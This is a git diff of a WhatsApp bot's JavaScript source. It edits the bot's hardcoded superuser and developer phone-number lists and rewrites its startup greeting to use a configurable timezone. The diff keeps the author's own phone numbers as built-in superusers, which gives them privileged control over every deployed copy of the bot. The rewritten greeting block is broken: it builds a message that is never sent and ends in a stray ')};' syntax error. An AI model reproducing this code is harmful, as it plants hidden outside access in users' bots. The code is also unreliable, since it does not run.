@@ -659,10 +659,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254737681758", '254114141192', '254737681758', "254114141192", '254737681758', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254737681758", '254114141192', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254114141192', '254737681758', "254737681758", '254737130240'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254114141192', '254737130240'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -1427,44 +1427,46 @@ if (texte && texte.startsWith('>')) {
           md = "undefined";
         }
         console.log("Beltah md successfully connected✅");
-        await activateCrons();
-const getGreeting = () => {
-        const currentHour = DateTime.now().setZone('Africa/Nairobi').hour;
+  await activateCrons();
+                const date = new Date();
+                const formattedDate = date.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', timeZone: conf.TIMEZONE });
+                const formattedTime = date.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', timeZone: conf.TIMEZONE });
+                const getGreeting = () => {
+        const currentHour = DateTime.now().setZone(conf.TIMEZONE).hour;
 
         if (currentHour >= 5 && currentHour < 12) {
-          return 'Good morning 🌄';
+          return 'Good morning🌄';
         } else if (currentHour >= 12 && currentHour < 18) {
           return 'Good afternoon ☀️';
         } else if (currentHour >= 18 && currentHour < 22) {
-          return 'Good evening 🌆';
+          return 'Good evening🌇';
         } else {
-              return 'Good night 😴';
+              return 'Good night🌃';
             }
         };
 
 
         const getCurrentTimeInNairobi = () => {
-            return DateTime.now().setZone('Africa/Nairobi').toLocaleString(DateTime.TIME_SIMPLE);
+            return DateTime.now().setZone(conf.TIMEZONE).toLocaleString(DateTime.TIME_SIMPLE);
         };
-
-        if (conf.DP.toLowerCase() === 'yes') {
-          await zk.sendMessage(zk.user.id, {
-            text: `*Hello👋, ${getGreeting()},*
-╭════⊷
-║ *『${conf.BOT} 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞』*
-║    Owner : ${conf.OWNER_NAME}
-║    Prefix : [  ${prefixe} ]
-║    Mode : ${md} mode
-║    Total Commands : ${evt.cm.length}
+                
+                if((conf.DP).toLowerCase() === 'yes') {     
+                let cmsg = `*${getGreeting()}* *${conf.OWNER_NAME}*  
+                
+ ╭════⊷         
+║ *『 ${conf.BOT} 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞』*
+║  🥏Prefix : [ ${prefixe} ]
+║  🛸Mode :${md}
+║  🕒Time : ${formattedTime}
+║  📆Day : ${formattedDate} 
+║  📼Commands : ${evt.cm.length}︎
 ╰═════════════════⊷
 
 ╭───◇
-┃
-┃ *Thank you for choosing*                      
-┃  ${conf.BOT}
-> Regards Beltah Tech 
-╰═════════════════⊷ `
-          });
+> *Thank you for choosing*                      
+> *${conf.BOT}*
+╰═════════════════⊷`;
+     )};
         }
       } else if (connection == "close") {
         let raisonDeconnexion = new boom_1.Boom(lastDisconnect?.error)?.output.statusCode;
